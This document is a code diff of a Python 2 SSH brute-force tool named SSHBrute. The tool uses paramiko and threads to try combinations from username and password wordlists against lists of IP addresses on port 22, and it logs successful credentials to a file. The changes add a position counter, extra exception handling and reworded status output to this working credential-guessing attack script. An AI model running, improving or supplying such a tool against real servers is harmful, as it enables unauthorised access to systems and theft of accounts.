@@ -15,13 +15,14 @@ class SSHBrute:
         self.args_parser()
         self.success=[]
         self.error=[]
+        self.pos=0
     def ssh_login(self, ip, usr, pwd):
         ssh = SSHClient()
         ssh.set_missing_host_key_policy(AutoAddPolicy())
         try:
             # ssh.connect(self.targetIp, port=int(self.portNumber),username=self.username, password=self.password,timeout=int(self.timeoutTime), allow_agent=False, look_for_keys=False)
             if self.args.verbose:
-                sys.stdout.write("Trying %s %s/%s                       \n" % (ip, usr, pwd))
+                sys.stdout.write("Trying %s %s/%s                             \n" % (ip, usr, pwd))
                 sys.stdout.flush()
             ssh.connect(ip, port=22, username=usr, password=pwd, timeout=10, allow_agent=False, look_for_keys=False)
             ssh.close()
@@ -29,14 +30,14 @@ class SSHBrute:
             sys.stdout.flush()
             if self.args.out:
                 f=open(self.args.out,'a')
-                f.write("Success! %s %s/%s                       \n"%(ip,usr,pwd))
+                f.write("Success! %s %s/%s                                    \n"%(ip,usr,pwd))
                 f.close()
             self.success.append(ip)
             return True
         except paramiko.AuthenticationException:
             ssh.close()
             if self.args.verbose:
-                sys.stdout.write("Faild %s %s/%s                       \n" % (ip, usr, pwd))
+                sys.stdout.write("Faild %s %s/%s                               \n" % (ip, usr, pwd))
                 sys.stdout.flush()
             return False
         except paramiko.SSHException:
@@ -44,6 +45,9 @@ class SSHBrute:
             self.error.append(ip)
             return False
         except timeout:
+            self.error.append(ip)
+            return False
+        except EOFError:
             self.error.append(ip)
             return False
         except:
@@ -72,8 +76,8 @@ class SSHBrute:
                 t = threading.Thread(target=self.ssh_login, args=(ip, usr, pwd))
                 t.daemon = True
                 t.start()
-                # t.join(1)
-                sys.stdout.write("Current threads:%d success:%d error:%d\r" % (threading.active_count(), len(self.success), len(self.error)))
+                self.pos+=1
+                sys.stdout.write("Current threads:%d positon:%d success:%d error:%d       \r" % (threading.active_count(),self.pos, len(self.success), len(self.error)))
                 sys.stdout.flush()
                 return True
             else:
@@ -93,6 +97,7 @@ class SSHBrute:
                                 for pwd in passlist.readlines():
                                     pwd=pwd.strip()
                                     with open(self.args.iplist) as iplist:
+                                        self.pos=0
                                         for ip in iplist.readlines():
                                             ip=ip.strip()
                                             self.start_thread(ip,usr,pwd)
@@ -101,6 +106,7 @@ class SSHBrute:
                         for usr in userlist.readlines():
                             usr = usr.strip()
                             with open(self.args.iplist) as iplist:
+                                self.pos = 0
                                 for ip in iplist.readlines():
                                     ip = ip.strip()
                                     self.start_thread(ip, usr, self.args.password)
@@ -112,11 +118,13 @@ class SSHBrute:
                         for pwd in passlist.readlines():
                             pwd = pwd.strip()
                             with open(self.args.iplist) as iplist:
+                                self.pos = 0
                                 for ip in iplist.readlines():
                                     ip = ip.strip()
                                     self.start_thread(ip, self.args.username, pwd)
                 elif self.args.password: #iplist singleuser singlepass
                     with open(self.args.iplist) as iplist:
+                        self.pos = 0
                         for ip in iplist.readlines():
                             ip = ip.strip()
                             self.start_thread(ip, self.args.username, self.args.password)
@@ -154,7 +162,7 @@ class SSHBrute:
             else:
                 print 'Too few arguments'
         while threading.active_count() != 1:
-            sys.stdout.write("Current threads:%d success:%d error:%d\r" % (threading.active_count(), len(self.success), len(self.error)))
+            sys.stdout.write("Waiting all threads to finish:%d success:%d error:%d        \r" % (threading.active_count(), len(self.success), len(self.error)))
             sys.stdout.flush()
             time.sleep(1)
     def main(self):
